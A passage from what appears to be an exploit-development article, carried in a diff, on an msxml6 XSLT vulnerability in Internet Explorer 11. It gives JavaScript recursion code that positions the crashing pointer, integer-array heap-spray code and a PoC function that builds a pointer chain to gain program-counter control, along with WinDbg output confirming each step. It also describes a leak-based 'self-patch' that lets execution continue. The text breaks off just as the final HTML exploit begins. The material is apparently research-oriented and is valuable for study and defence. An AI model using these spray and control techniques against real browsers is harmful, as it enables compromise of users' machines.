+  msxml6!XEngine::stns:
+  6f6f9c7f 8b81b0000000    mov     eax,dword ptr [ecx+0B0h]
+  6f6f9c85 8b5008          mov     edx,dword ptr [eax+8]
+
+  0:007> dds ecx+b0-2
+  0d5c9ff0  0532af20
+  0d5c9ff4  0532b040
+
+  0:007> k
+  ChildEBP RetAddr
+  0532af18 6f6e60cc msxml6!XEngine::stns+0x6
+  0532b038 6f6e60cc msxml6!XEngine::frame+0x84
+  0532b0b8 6f6f3e2d msxml6!XEngine::frame+0x84
+  0532b168 6f75ffb0 msxml6!XEngine::execute+0x1b4
+
+
+Given the above listing, it would be nice to have the second
+XEngine::frame() call happening around e.g. 0x05320300, that would send
+the crashing pointer value 0x0300053a to XEngine::stns(), pointing to the
+heap. Which requires that, prior to the vulnerable procedure call, the
+thread must make function calls and stack frame allocations worth of
+approximately 42 kilobytes of stack memory and never pop them.
+
+
+--[ 3.1 - Inflating the stack 1: XSLT recursion
+
+The obvious way to inflate the stack is to generate a recursion on the
+stack, which should be possible with any dynamic technology available to
+the target application. My first idea was to use XSLT itself for this.
+Indeed, the following code, which is the classical Hanoi algorithm
+implementation in XSLT, will produce a massive recursion on the stack (
+for the record, it might even DoS the browser with big enough $n):
+
+
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+
+<xsl:template match="/">
+  <xsl:variable name="n">
+    <xsl:value-of select="//arg/@n"/>
+  </xsl:variable>
+  <xsl:element name="hanoi-solve">
+  <xsl:call-template name="dohanoi">
+    <xsl:with-param name="n" select="30"/>
+    <xsl:with-param name="to" select="3"/>
+    <xsl:with-param name="from" select="1"/>
+    <xsl:with-param name="using" select="2"/>
+  </xsl:call-template>
+</xsl:element>
+</xsl:template>
+
+<xsl:template name="dohanoi">
+  <xsl:param name="n"/>
+  <xsl:param name="to"/>
+  <xsl:param name="from"/>
+  <xsl:param name="using"/>
+  <xsl:if test="number($n) &gt; 0">
+
+  <xsl:call-template name="dohanoi">
+    <xsl:with-param name="n" select="number($n) - 1"/>
+    <xsl:with-param name="to" select="$using"/>
+    <xsl:with-param name="from" select="$from"/>
+    <xsl:with-param name="using" select="$to"/>
+  </xsl:call-template>
+
+  <xsl:element name="move">
+  <xsl:attribute name="from">
+    <xsl:value-of select="$from"/>
+  </xsl:attribute>
+  <xsl:attribute name="to">
+    <xsl:value-of select="$to"/>
+  </xsl:attribute>
+  </xsl:element>
+
+  <xsl:call-template name="dohanoi">
+    <xsl:with-param name="n" select="number($n) - 1"/>
+    <xsl:with-param name="to" select="$to"/>
+    <xsl:with-param name="from" select="$using"/>
+    <xsl:with-param name="using" select="$from"/>
+  </xsl:call-template>
+
+  <xsl:for-each select="*">
+    <xsl:apply-templates/>
+  </xsl:for-each>
+
+</xsl:if>
+</xsl:template>
+
+<xsl:template name="xxx_nonexistent" match="//xxx[position()]" />
+
+</xsl:stylesheet>
+
+
+Sadly, the XSLT-based recursion inflates the stack above and not below the
+crashing pointer sources stack frame, and thus the recursion does not
+affect the crashing context at all:
+
+
+  ChildEBP RetAddr
+  0ed783e8 711b60cc msxml6!XEngine::stns
+  0ed78588 711b60cc msxml6!XEngine::frame+0x84
+  0ed78728 711b60cc msxml6!XEngine::frame+0x84
+  0ed788c8 711b60cc msxml6!XEngine::frame+0x84
+  0ed78a68 711b60cc msxml6!XEngine::frame+0x84
+  0ed78c08 711b60cc msxml6!XEngine::frame+0x84
+  0ed78da8 711b60cc msxml6!XEngine::frame+0x84
+  ; skipped many frame()'s
+  0ed7b5e8 msxml6!XEngine::frame+0x84
+  ; --> the vulnerable stack frame <--
+  0ed7b668 711c3e2d msxml6!XEngine::frame+0x84
+  0ed7b710 7122ffb0 msxml6!XEngine::execute+0x1b4
+  0ed7b76c 7122fee3 msxml6!XUtility::executeXCode+0x90
+  0ed7b7c0 7122fe2b msxml6!XUtility::transformNode+0x4a
+  0ed7b82c 7122fda2 msxml6!DOMNode::transformNode+0xa6
+  ...
+
+
+--[ 3.2 - Inflating the stack 2: JavaScript recursion
+
+After the fail with XSLT recursion I turned back to JavaScript. The
+following simple factorial implementation will produce a massive
+recursion on the stack:
+
+
+  function factorial(n) {
+    if(n == 0) {
+        trigger();
+        return 1
+    } else {
+        return n * factorial(n - 1);
+    }
+  }
+  ...
+  <body onload="factorial(63)">
+
+
+The vulnerability must be triggered from within the recursive code in
+order to enjoy the inflated stack situation:
+
+
+  msxml6!XEngine::stns+0x6:
+  711c9c85 mov     edx,dword ptr [eax+8] ds:0023:03a004ca=????????
+
+  0:005> !address eax
+
+  Usage:                  PageHeap
+  Base Address:           03961000
+  End Address:            03a60000
+  Region Size:            000ff000
+  State:                  00002000  MEM_RESERVE
+  Protect:                <info not present at the target>
+  Type:                   00020000  MEM_PRIVATE
+  Allocation Base:        03960000
+  Allocation Protect:     00000001  PAGE_NOACCESS
+  More info:              !heap -p 0x3541000
+  More info:              !heap -p -a 0x3a004c2
+
+
+  0:005> !heap
+  Index   Address  Name      Debugging options enabled
+  1:   016a0000
+  2:   015e0000
+  3:   00010000
+  4:   019f0000
+  5:   03720000 < landed here
+  6:   06470000
+  7:   06900000
+  8:   06cd0000
+  9:   07cb0000
+ 10:   07dd0000
+ 11:   09380000
+ 12:   07d60000
+ 13:   0c500000
+ 14:   0c670000
+ 15:   0cd30000
+
+
+This time a valid userland address was accessed, and the access violation
+was caused merely by the lack of a busy allocation on the address.
+
+According to the observations made across multiple tests, the thread
+stack will always start slightly below the edge of the memory page:
+
+
+  test 1:
+  0532fbbc 00000000 ntdll!_RtlUserThreadStart+0x1b
+  test 2:
+  04d7fd34 00000000 ntdll!_RtlUserThreadStart+0x1b
+  test 3:
+  04a5ffd8 00000000 ntdll!_RtlUserThreadStart+0x1b
+  test 4:
+  055bfe80 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+
+More precisely, the exact address of the beginning of the stack is
+variable within the range of roughly 0x600 bytes, and so are the pointers
+to stack-based variables; thus, the crashing pointer would be variable by
+0x06000000 on x86 systems, which means that the initial invalid memory
+access would be observed at a random memory address within a 100 Mb
+memory range.
+
+At this point we have two separate problems: first, to quickly fill at
+least 200-300 Mb of memory with controlled data (100 Mb required to catch
+the initial memory access, plus the room for secondary pointer
+dereference padding, plus some compensation for the allocation addresses
+variability), and second, to direct the crashing pointer into a specific
+region of that memory.
+
+Note that, although heap spraying is considered a bad practice for a good
+reason, and that it's highly constrained if not impossible on 64bit
+systems with 128G of memory space to fill, but the nature of our
+vulnerability does not allow for an alternative approach. So, let's just
+take it as an exercise in the artful dealing with whatever is.
+
+
+--[ 3.4 - Filling the memory 1: images
+
+Because the memory region that must be controlled is rather big, my
+initial idea was to utilize some pre-calculated big objects for filling
+it, such as images. The core of the idea is that, every piece of data
+that can be consumed and processed by the target application (e.g. output
+or rendered) has its place and a representation in the target process
+memory. Thinking like that we don't get caught in stereotypical terms of
+'heap spraying' and the specific techniques associated with it, many of
+which are already mitigated in browsers.
+
+The idea of using graphical images in vulnerability development is not
+new. It was first introduced in 2006 by Sutton et al.[3], whose research
+focused mainly on the aesthetics of shellcode steganography in images
+rather than solving of any problems of heap spraying (as there were none
+at that time). Later, a few researchers revisited the same idea in the
+context of heap spraying, but it has never found a real application,
+mainly because bitmaps (as the only format capable of incorporating a
+byte pattern 'as is') are huge and can only be shrinked with the help of
+server-side measures, while using other image formats for memory control
+purposes is burdened with calculation problems of recompression.
+
+Apart from the server-side GZIP compression, another solution that's never
+publicly noted is PNG. The PNG compression is very simple and does not
+affect the bitmap structure at large. As a result, a 2Mb BMP image
+containing a simple 1-byte pattern can be converted into a ~500 bytes PNG
+image, that will be decompressed back into the original bitmap in the
+rendering process memory.
+
+There are two problems however:
+
+1. The more variable is the source bitmap pattern, the bigger is the
+resulting PNG image; a natural limitation of any compression.
+
+2. The decompressed PNG has extra bytes in the bitmap data, injected after
+every 3 bytes of the original bitmap. It's probably a transparency channel
+or some other data specific to the PNG format.
+
+The good news:
+
+1. At the point when the PNG image is loaded and decompressed by the
+browser but is not yet displayed on the web page, the bitmap data in the
+process memory fully corresponds to the source BMP.
+
+2. A large image is mapped into a comparably large and continuous chunk of
+memory, located at a somewhat predictable memory offset.
+
+The PNG spraying technique proved to be not suitable for this particular
+case because a highly variable memory padding pattern would be required,
+and so the images would have to be too big anyway. However it still looks
+like an interesting technique for rapid filling of huge memory areas with
+a simple byte pattern.
+
+
+--[ 3.5 - Filling the memory 2: integers
+
+After testing various memory filling techniques, I've finally settled on
+integer arrays. The following JavaScript code will quickly fill 400Mb of
+the memory of Internet Explorer 11 with a continuous constant-dword spray:
+
+
+  var intArr = new Array;
+  var count = (0x19000000-0x20)/4;
+  intArr[0] = 0x01c0ffee; // marker // s 0 l?80000000 ee ff c0 01
+  for(var i=1; i<=count; i++)
+  intArr[i] = 0x17151715;
+  alert('done');
+
+
+It's curious to note that varying the values in the spraying loop may
+sometimes result in an internal exception in IE, e.g. when trying to fill
+more than 400 Mb of the browser memory, or using an 'AAAA' integer
+equivalent for the filling. This looks like a protection from heap
+spraying, but it does not pose a major obstacle to the task.
+
+The resulting memory filling is distributed across two big and continuous
+allocations as follows:
+
+
+  0:028> s 0 l?80000000 ee ff c0 01
+  0531b4f0  ee ff c0 01 f8 ff ff ff-00 00 00 00 00 00 00 00  .............
+  ; just the marker dword, not relevant
+  08391860  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; a <0x200 bytes chunk, not relevant
+  085dd0d8  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; a <0x10 bytes chunk, not relevant
+  085de510  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; a <0x200 bytes chunk, not relevant
+  12da5a18  ee ff c0 01 e3 ff c0 01-ce ff c3 01 b8 ff cc 01  .............
+  ; random garbage
+  2c540020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; the array, part 1
+  3eec0020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; the array, part 2
+
+
+The first allocation looks like simply unfinished, stopped around 300Mb,
+while the second allocation is full, and both of them are contiguous:
+
+
+  0:028> s 0 l?80000000 ee ff c0 01
+  ...
+  2c540020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3eec0020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+
+  0:028> ? 3eec0020-2c540020
+  Evaluate expression: 311951360 = 12980000
+
+  0:028> db 2c540020+12980000-30
+  ; this is the borderline between the 1st and the 2nd allocations
+  3eebfff0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  .............
+  3eec0000  00 00 00 00 90 c4 fb 1e-00 00 00 00 00 00 00 00  .............
+  3eec0010  00 00 00 00 f9 ff 3f 06-20 f1 be 07 00 00 00 00  ......?. ....
+  3eec0020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3eec0030  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3eec0040  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3eec0050  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3eec0060  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+
+  0:028> db 2c540020+12000000
+  ; end of the 1st allocation is somewhere in between sizes
+  ; 12000000 and 12980000
+  3e540020  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540030  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540040  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540050  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540060  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540070  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540080  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  3e540090  15 17 15 17 15 17 15 17-15 17 15 17 15
+
+  ;the second allocation:
+  0:028> db 3eec0020+19000000
+  ; pointers after the end of the allocation
+  57ec0020  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0030  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0040  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0050  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0060  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0070  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0080  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0090  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  0:028> db 3eec0020+19000000-30
+  ; end of the second allocation
+  57ebfff0  15 17 15 17 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  57ec0000  15 17 15 17 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0010  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0020  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0030  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0040  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0050  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+  57ec0060  02 00 00 80 02 00 00 80-02 00 00 80 02 00 00 80  .............
+
+
+Considering the addressing predictability of the allocations, two
+observations can be made across multiple tests:
+
+1. Both allocations are aligned by 16 pages, added 0x20 bytes header with
+full page heap setting enabled (or 0x8 with the default setting).
+
+2. The memory addresses of both allocations are highly predictable.
+
+In fact, the addresses of the two allocations would vary across the tests
+by 'just' approximately 0x1'000'000 bytes, which is not significant in
+terms of a 0x19'000'000+0x12'000'000 nearly continuous controlled memory
+space:
+
+
+  ; windbg script log edited for readability
+  ; produced by re-launching the app and recording the same allocations
+  ; shows the addresses of the two intarray allocations
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x27f30020
+  0x3a8b0020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x283f0020
+  0x3ad70020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x27ea0020
+  0x3a820020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28530020
+  0x3aeb0020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x284e0020
+  0x3ae60020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28aa0020
+  0x3b420020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28e60020
+  0x3b7e0020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28440020
+  0x3adc0020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28560020
+  0x3aee0020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28480020
+  0x3ae00020
+  Opened log file 'c:\users\user\desktop\windbg.log'
+  0x28a00020
+  0x3b380020
+
+
+Without researching the exact reasons of the highly predictable memory
+allocations, it seems logical if not inevitable that, the bigger the
+allocation, the more predictable its address would be on x86 systems
+because of the memory space limitation. This speculation is totally
+confirmed by observations with various allocation sizes.
+
+Considering the reliability risks of the allocations disposition in the
+memory, the expected memory map will likely change in the following
+situations:
+
+1. Additional modules loaded by the browser, such as a BHO or an ActiveX.
+This factor cannot possibly be remote-controlled. On the other hand, the
+average size of an executable module is insignificant in terms of a 400Mb
+controlled memory allocation, so it shouldn't distort the expected memory
+map too much.
+
+2. Additional web content processed in the same tab (images loaded,
+JavaScript executed etc.), that would change the stack situation. Because
+each IE tab is loaded in a separate process, this factor can be totally
+controlled by the vulnerable web page.
+
+3. Microsoft changes IE internals. Not possible to control.
+
+4. Full page heap setting enabled or disabled. The full page heap setting
+changes the entire memory layout significantly enough that the
+vulnerability control code must be fine-tuned with this regard
+specifically.
+
+All in all, at that point the memory landing space looks safe enough to
+be addressed.
+
+
+--[ 3.6 - Recursion control
+
+Having the control over the continuous region of memory in the range
+[0x28000000,0x57000000], it would probably be the safest to direct the
+crashing pointer in the middle of the range, e.g. around 0x47000000. To
+achieve this, the JavaScript recursion count must be specifically
+calculated to reach the crashing procedure around the stack offset of
+0x...4700.
+
+The size of one JavaScript recursion frame in Internet Explorer 11 is
+0x320, each frame corresponding to one cycle of the factorial algorithm:
+
+
+  ; JavaScript factorial algorithm recursion on the stack
+  0529b0d4 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x1e8
+  0529b0e0 0x86c0fd9
+  0529b428 jscript9!Js::InterpreterStackFrame::Process+0xbd7
+  0529b544 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x1e8
+  0529b550 0x86c0fd9
+  0529b898 jscript9!Js::InterpreterStackFrame::Process+0xbd7
+  0529b9b4 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x1e8
+  0529b9c0 0x86c0fd9
+
+
+Provided that the vulnerable browser will crash randomly around the stack
+offsets 0x...ac00 to 0x...b300, the stack must be inflated by
+0xb650(+-0x350)-0x4700=0x6f50(+-0x350) bytes, which requires
+(0x6f50+-0x350)/0x320=35+-1 cycles of recursion, or the call to
+factorial(35). Indeed, testing this would cause an access violation
+around the desired address:
+
+
+  (268.2a4): Access violation - code c0000005 (first chance)
+  First chance exceptions are reported before any exception handling.
+  This exception may be expected and handled.
+  eax=489019b1 ebx=1a819ff0 ecx=1a819f42 edx=6f6e4430 esi=1a819f40
+  edi=19b14770 eip=6f6f9c85 esp=19b1476c ebp=19b14888 iopl=0
+  nv up ei pl nz na pe nc
+  cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000 efl=00010206
+  msxml6!XEngine::stns+0x6:
+  6f6f9c85 mov     edx,dword ptr [eax+8] ds:0023:489019b9=????????
+
+
+--[ 3.7 - Program counter control
+
+According to the vulnerable XCode execution logic, the address of the
+dynamic call in XEngine::brns() is retrieved via three consecutive
+dereferences from the crashing pointer:
+
+
+  msxml6!XEngine::stns:
+  6f6f9c7f mov     eax,dword ptr [ecx+0B0h] ; retrieved ptr0 (eax)
+  6f6f9c85 mov     edx,dword ptr [eax+8] ; ptr0 -> crash / ptr1 (edx)
+  6f6f9c88 push    esi
+  6f6f9c89 lea     esi,[edx+0Ch]
+  6f6f9c8c mov     dword ptr [eax+8],esi
+  6f6f9c8f mov     eax,dword ptr [edx+4] ; ptr1 -> ptr2 (eax)
+  6f6f9c92 push    8
+  6f6f9c94 mov     dword ptr [ecx+0A4h],eax ; store ptr2
+  6f6f9c9a pop     eax
+  6f6f9c9b pop     esi
+  6f6f9c9c ret
+  ...
+  msxml6!XEngine::brns:
+  712da250 mov  edi,edi
+  712da252 push esi
+  712da253 mov  esi,ecx
+  712da255 mov  ecx,dword ptr [esi+0A4h];restore ptr2 (2 bytes randomized)
+  712da25b mov  eax,dword ptr [ecx]  ; ptr2 -> ptr3 (eax)
+  712da25d call dword ptr [eax] ; ptr3 -> shellcode
+
+
+Thus, the landing memory contents at ptr0 must satisfy the following
+dereference logic:
+
+
+  Ptr0 (initial AV / address in the spray ) ->
+  ptr1 -> ptr2 -> ptr3 -> shellcode
+
+
+In the above chain of pointers, pointers 1 and 3 are precise, as they are
+read from  the memory padding; but pointer 0 is random within a 100Mb
+range due to the nature of the bug, and pointer 2 is only page-precise
+due to the 2-byte memory alignment differences in the procedures where
+the pointer is stored and then restored.
+
+Thanks to the randomized memory access only on the 0th and the 2nd
+pointers, two split memory areas are required to contain the entire
+dereference chain, one part (and the first dereferenced) containing the
+pointers to the second part, the second part containing the pointers to
+the shellcode, and the presize addresses treated specifically:
+
+
+  function poc()
+  {
+    // !!! +hpa required !!!
+    // bp msxml6!xengine::stns; bp msxml6!xengine::brns; g;
+
+    var intArr = new Array;
+    intArr[0] = 0x01c0ffee; // marker // s 0 l?80000000 ee ff c0 01
+
+    var count = (0x19000000-0x20)/4; // 400 Mb
+
+    for(var i=1; i<=count; i++)
+    {
+        // part1: ptr0/ptr1 read
+        if ( i<(0x12000000/4) )
+        {
+
+            if ( ((i*4+0x20)&0xffff) == (0x3c3c+4) ) //if it's a ptr1 read
+                intArr[i] = 0x54545454; // then yield ptr2
+            else
+                intArr[i] = 0x3c3c3c3c; // otherwise, ptr1
+
+        }
+        // part2: ptr2 read
+        else
+            intArr[i] = 0x00badd1e; // ptr3 -> shell code
+    }
+    crash();
+  }
+
+
+The numerical values in the script were chosen empirically with the full
+page heap enabled; tweak them if anything doesn't work.
+
+
+  And the result should be:
+  (ddc.f28): Access violation - code c0000005 (first chance)
+  First chance exceptions are reported before any exception handling.
+  This exception may be expected and handled.
+  eax=00badd1e ebx=11f71ff0 ecx=5454492c edx=5454492c esi=11f71f40
+  edi=04ef4740 eip=6f6fa25d esp=04ef4738 ebp=04ef4858 iopl=0
+  nv up ei pl nz na po nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b
+  gs=0000             efl=00210202
+  msxml6!XEngine::brns+0xd:
+  6f6fa25d ff10          call    dword ptr [eax] ds:0023:00badd1e=????????
+
+
+--[ 4 - The self-patch
+
+The next section will discuss the possible useful application of the
+gained control over the vulnerability without any shell code execution:
+self-patching of the vulnerable process.
+
+
+--[ 4.1 - A leak without a leak
+
+Unlike many memory corruption vulnerabilities, this particular one does
+not allow for an arbitrary memory write that could be used to leak some
+information allowing to bypass DEP and ASLR and to execute arbitrary code
+within the IE sandbox. But the nature of the vulnerability would still
+allow for a small and limited information leak, which can be used to
+restore the memory values, required to continue the normal execution (
+CoE) of the vulnerable application.
+
+Specifically, because the crashing pointer contains the upper word of the
+stack offset in its lower part due to the misaligned memory read, and the
+controlled memory space is page-aligned, it is possible to 'leak' part of
+the stack address by translating the accessed memory address into the
+value read from that address with the help of the carefully calculated
+memory padding.
+
+There are a few key points to understand about our precisely patterned
+padding.
+
+1. We start with the idea that each dword in the spray must contain the
+value of its own offset to the page. Page-size patterning is enough
+because we only want to leak about 2 bytes of the stack address.
+
+2. Next, we calculate all pattern values based on the spray loop counter
+as follows: i_pattern = i*4%0x1000;
+
+3. We ensure that the aligned spray will as well align in memory by
+allocating a big enough continuous chunk of memory. Big memory
+allocations tend to be 16-pages aligned, i.e. starting with an address
+like 0xXYZQ0000 (see also windbg.log above), which looks like a sane
+memory optimization strategy with the
+heap manager.
+
+4. Next, because the padding must resolve two consecutive memory
+dereferences while preserving the leaked bits of data inside the actual
+pointers, we split the page-sized pattern in two halves and fill them
+differently:
+
+
+  else if (i_pattern < 0x0700)
+    intArr[i] = ptr12base + ptr1;
+  else
+    intArr[i] = ptr12base + ptr2;
+
+
+This trick is only possible because of very little entropy observed in the
+high-order part of the randomly allocated stack offset, which tends to be
+around 0x04xxxxxx-0x06xxxxxx. Hence we in fact only want to leak 11 bits
+of the address and not 16, for which a 0x700 bytes pattern is sufficient.
+
+5. We differentiate the pointers in the two parts of the pattern by
+adding and removing a hand-picked, semi-random delta value to the leaking
+part of the pointer:
+
+
+  var delta = 0x3300;
+
+
+6. Finally, we adjust the calculations to the values of the respective
+dereference indexes, e.g. [eax+8] for the first read, as well as to the
+size of the heap header, which is 0x20 with full page heap:
+
+
+  ptr1 = (i_pattern - 8 + 0x20 + delta);
+  ptr2 = (i_pattern - 4 + 0x20 - (delta&0xfff));
+
+
+Note that we mindfully use a delta value bigger than the size of the
+pattern, and then we also preserve the 2 higher bits of the added delta
+value in the 2nd stage pointers, that will eventually increase the
+reliability of the padding in the cases of misaligned memory access by
+ensuring that the majority of bytes in the spray will be equal to 0x38,
+and thus the final pointer will likely point into the controlled memory
+around 0x38xxxxxx, regardless of both the reading
+alignment and the leaked bits in the pointer.
+
+As a result of the correctly calculated and a correctly positioned
+padding, the initially read memory offset will re-surface in the program
+as the low-order word of the value that's eventually read from the range
+0x3838xxxx:
+
+
+  0:007> dd 4b6004e0+8
+  ; 4b6004e0 = the original AV pointer
+  ; 0th read // mov     edx,dword ptr [eax+8]
+  4b6004e8  383837e0 383837e4 383837e8 383837ec
+  4b6004f8  383837f0 383837f4 383837f8 383837fc
+  4b600508  38383800 38383804 38383808 3838380c
+  4b600518  38383810 38383814 38383818 3838381c
+  4b600528  38383820 38383824 38383828 3838382c
+  4b600538  38383830 54545454 38383838 3838383c
+  4b600548  38383840 38383844 38383848 3838384c
+  4b600558  38383850 38383854 38383858 3838385c
+  0:007> dd 383837e0+4
+  ; 1st read // 04e0 is the high word of the stack address
+  383837e4  383804e0 383804e4 383804e8 383804ec
+  383837f4  383804f0 383804f4 383804f8 383804fc
+  38383804  38380500 38380504 38380508 3838050c
+  38383814  38380510 38380514 38380518 3838051c
+  38383824  38380520 38380524 38380528 3838052c
+  38383834  38380530 38380534 54545454 3838053c
+  38383844  38380540 38380544 38380548 3838054c
+  38383854  38380550 38380554 38380558 3838055c
+
+
+The read value, that is the two leaked bytes of the stack offset, will
+then be used by the application itself to restore the original 3rd
+pointer, which results in retrieving of the correct address of the
+dynamic call in XEngine::brns(), and resuming of the program execution
+like if there was no vulnerability:
+
+
+  0:007> p
+  ; our crafted value (read from the memory padding)
+  ; with 2 leaked bytes of the stack address 04e0:
+  eax=383804e0
+  ...
+  ; write the crafted value
+  msxml6!XEngine::stns+0x15:
+  6f6f9c94 8981a4000000    mov     dword ptr [ecx+0A4h],eax
+
+  ; value written via the misaligned pointer:
+  0:007> dd ecx+a4 l1
+  11b3dfe6  4c1404e0
+
+  ; value read via the sane pointer:
+  0:007> dd ecx+a4-2
+  11b3dfe4  04e04c2c
+
+  ; looks good:
+  0:007> dds 04e04c2c
+  04e04c2c  6f6e44b8 msxml6!RTFNodeSet::`vftable'
+
+  ; the original call pointer restored:
+  0:007> dds poi 04e04c2c
+  6f6e44b8  6f6e44d5 msxml6!XPSingleTextNav<WhitespaceCheck>::_getParent
+
+
+And the result is the target application passing the crash-inducing code
+without a crash:
+
+
+                   *------------------------*
+                   | Message from webpage X |
+                   |------------------------|
+                   |                        |
+                   |     Look, no calc!     |
+                   |                        |
+                   |         / OK /         |
+                   *------------------------*
+
+
+--[ 4.2 - The offset-to-value translation
+
+As per my testing boxen, the upper word of the stack address would never
+exceed 0x06xx, and thus the crashing pointer would always fall within the
+first 0x700 bytes of the target memory page, so the remaining 0x900 bytes
+of the page may be used for the translation purposes:
+
+
+  var i_pattern = i*4%0x1000; // index into the current page
+
+  ptr1 = (i_pattern - 8 + 0x20 + delta);
+  ptr2 = (i_pattern - 4 + 0x20 - (delta&0xfff));
+
+  if (i_pattern < 0x0700)
+    intArr[i] = ptr12base + ptr1;
+  else
+    intArr[i] = ptr12base + ptr2;
+
+
+The problem here is that the original crashing pointer is not guaranteed
+to be correctly aligned, while the memory translation pattern must be
+dword-aligned. That is, the correctly aligned memory access will result
+in reading a value like 0x3838XYZQ from the spray, where XYZQ are the
+leaked bits of the stack offset. But let's see what's read with a
+misaligned pointer:
+
+a. off by 1: 0x38XYZQ38
+
+In this case the pointer still falls into the controlled memory area, but
+the XY bits of the leaked stack address will be mangled, because we can
+only guarantee 64Kb alignment of memory allocations.
+
+b. off by 2: 0xXYZQ3838
+
+All bits of the stack address are lost, and the pointer looks
+unpredictable. But we can still enforce this to point to the controlled
+memory around 0x38xxxxxx by adding a specially crafted delta value of
+0x3300 to calculated pointers in the spray as was mentioned earlier. So,
+e.g. the read value 0x07073838 will become a valid pointer to 0x3a373838.
+This is possible because the high 4 bits of the stack offset tend to be
+zero.
+
+c. off by 3: 0xZQ3838XY
+
+Most important bits of the stack offset are lost in this case, and also
+the ZQ leaked bits are highly entropic and cannot be made predictable as
+in the case b. Not much can be done with this case, that's likely to
+point into random memory and possibly cause an access violation.
+
+One thing to notice about the misalignment cases above is that both
+pointers a. and b. quite logically end with 0x38 that we use as the
+pattern base. So, we can catch 2 out of 3 misalignment cases in the code
+by checking the final byte against this value, and then address them
+specifically e.g. to fall back to raw EIP control instead of allowing a
+crash:
+
+
+  // the address ends with 0x38+4:
+  if ( ((i*4+0x20)&0xff) == (pbyte+4) )
+    intArr[i] = ptrcall;
+  ...
+  0:007> r
+  eax=4fc0055e ; the crashing pointer
+  ...
+  0:007> dd eax+8
+  ; 0th read: misaligned
+  4fc00566  38603838 38643838 38683838 386c3838
+  4fc00576  38703838 38743838 38783838 387c3838
+  4fc00586  38803838 38843838 38883838 388c3838
+  4fc00596  38903838 38943838 38983838 389c3838
+  4fc005a6  38a03838 38a43838 38a83838 38ac3838
+  4fc005b6  38b03838 38b43838 38b83838 38bc3838
+  4fc005c6  38c03838 38c43838 38c83838 38cc3838
+  4fc005d6  38d03838 38d43838 38d83838 38dc3838
+  0:007> dd 38603838+4
+  ; 1st read: special value
+  3860383c  54545454 3838053c 38380540 38380544
+  3860384c  38380548 3838054c 38380550 38380554
+  3860385c  38380558 3838055c 38380560 38380564
+  3860386c  38380568 3838056c 38380570 38380574
+  3860387c  38380578 3838057c 38380580 38380584
+  3860388c  38380588 3838058c 38380590 38380594
+  3860389c  38380598 3838059c 383805a0 383805a4
+  386038ac  383805a8 383805ac 383805b0 383805b4
+  0:007> dd 54545454
+  ; 2nd read / call address
+  54545454  00badd1e 00badd1e 00badd1e 00badd1e
+  54545464  00badd1e 00badd1e 00badd1e 00badd1e
+  54545474  00badd1e 00badd1e 00badd1e 00badd1e
+
+
+Regarding the last, 3-bytes misaligned memory access case that reads
+pointers like 0xZQ3838XY where ZQ is totally random, this is asking to
+precisely control the contents of entire memory space of the process,
+that may be not impossible but is likely not worth it. So I leave it
+alone as a crash.
+
+
+The final code is:
+
+
+  <!doctype html>
+  <html>
+  <head>
+
+  <script>
+
+  function crash()
+  {
